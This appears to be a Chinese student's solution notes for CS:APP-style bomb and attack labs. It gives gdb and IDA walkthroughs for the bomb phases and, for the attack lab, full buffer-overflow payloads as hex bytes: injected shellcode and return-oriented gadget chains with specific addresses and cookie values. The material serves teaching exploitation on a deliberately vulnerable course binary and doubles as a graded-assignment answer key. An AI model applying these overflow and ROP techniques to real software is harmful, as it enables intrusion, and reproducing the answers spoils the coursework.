# lab2-3-help

## lab2

### phase1
首先gdb，b main，然后n到输入命令，随便输入一些，到phase_1，使用si，执行到call string_equal时查看参数。

### phase2
read_siz_nums读取6个数字放入(%rsi),4(%rsi),8(%rsi),c(%rsi),10(%rsi),14(%rsi)，之后根据rsi的信息判断是怎么比较的

### phase3
直接看IDA结果，是一个跳表，输入%d,%d，比较即可

### phase4
为斐波那契数列，输入第几个元素，返回值，对应表如下：
|输入|比较|
|---|---|
| 0 | 1 |
| 1 | 1 |
| 2 | 2 |
| 3 | 3 |
| 4 | 5 |
| 5 | 8 |
| 6 | 13 |
| 7 | 21 |
| 8 | 34 |
| 9 | 55 |
| 10 | 89 |
| 11 | 144 |
| 12 | 233 |
| 13 | 377 |
| 14 | 610 |

### phase5
为预先定义好的数组求和。需要找到数组地址，数组每个元素长度为4。输入为六个连续的数字。
IDA中_BYTE长度为4，_WORD为8，_DWORD为16，_QWORD为32。

### phase6
首先比较输入的每个数字，都要求小于等于6且不等于后面的任意一个数字。

之后跳出循环，将node的地址按照输入的顺序存入栈（(%rsp)），然后重构node之后的指针，使得其指向下一个。逐个比较node，使得值递增。

### 隐藏
在phase4之后输入字符可以解锁。为二叉树查找，可以手动画出二叉树，然后根据IDA进行计算。每个节点结构为8长度值+8长度左节点指针+8长度右节点指针。

## lab3
./hex2raw < phase_x.txt > phase_x.raw
gcc -c tmp.s -o tmp.o
objdump -D tmp.o > tmp.d
### phase1
首先确定touch1地址，然后连续输入6行每行8个字节的0，第六行输入地址，之后补全0即可。
故为：
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
(地址反向)   00 00 00 00 00

### phase2
同样地，首先确定输入栈起始位置，这里可以通过gdb得到，在汇编中搜索Gets，在此处打break，例如b *0x401bf1，运行到此处时输入栈起始位置可以通过rsp得到。然后确定touch2地址。
48 c7 c7 (cookie值反向) 68
(touch2地址反向) 00 c3 00 00 00
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
(栈地址反向)    00 00 00 00

movq $(cookie值),%rdi
pushq (touch2地址)
ret

### phase3
同样地，首先确定输入栈起始位置，这里可以通过gdb得到，在汇编中搜索Gets，在此处打break，例如b *0x401bf1，运行到此处时输入栈起始位置可以通过rsp得到。然后确定touch3地址。把cookie转为字符形式。正着转。0->48->0x30,a->97->0x61,A->65->0x41
48 c7 c7 (输入地址反向(为栈地址+0x40)) 68 
(touch3地址反向) 00 c3 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
(栈地址反向)    00 00 00 00
输入地址 -> 32 61 32 65 34 61 30 38(cookie值变换正向)

movq $(输入地址),%rdi
pushq (touch3地址)
ret

### phase4
首先记录下所有可执行的baget：
401d9c:movl %eax,%edi(89 c7 c3)
401db1:pop %rax(58 c3)
401dbd:movq %rax,%rdi(48 89 c7 c3)
401dd5:lea (%rdi,%rsi,1),%rax(48 8d 04 37 c3)
401dee:movl %edx,%esi(89 d6 *08 db* c3)
401e06:movl %eax,%ecx(89 c1 *38 c9* c3)
401e5c:movl %ecx,%edx(89 ca *90 90* c3)
401e00:movq %rsp,%rax(48 89 e0 *90* c3)
然后

00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
b1 1d 40(pop %rax 地址反向) 00 00 00 00 00 
08 4a 2e 2a(cookie值反向) 00 00 00 00
9c 1d 40(movl %eax,%edi 地址反向) 00 00 00 00 00
2e 1c 40(touch2地址反向) 00 00 00 00 00

## phase5
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 1e 40(movq %rsp,%rax 地址反向) 00 00 00 00 00
bd 1d 40(movq %rax,%rdi 地址反向) 00 00 00 00 00(ret后rsp指向此)
b1 1d 40(pop %rax 地址反向) 00 00 00 00 00
48 00 00 00 00 00 00 00
06 1e 40(movl %eax,%ecx 地址反向) 00 00 00 00 00
5c 1e 40(movl %ecx,%edx 地址反向) 00 00 00 00 00
ee 1d 40(movl %edx,%esi 地址反向) 00 00 00 00 00
d5 1d 40(lea (%rdi,%rsi,1),%rax 地址反向) 00 00 00 00 00
bd 1d 40(movq %rax,%rdi 地址反向) 00 00 00 00 00
05 1d 40(touch3 地址反向) 00 00 00 00 00 
32 61 32 65 34 61 30 38(cookie转换正向)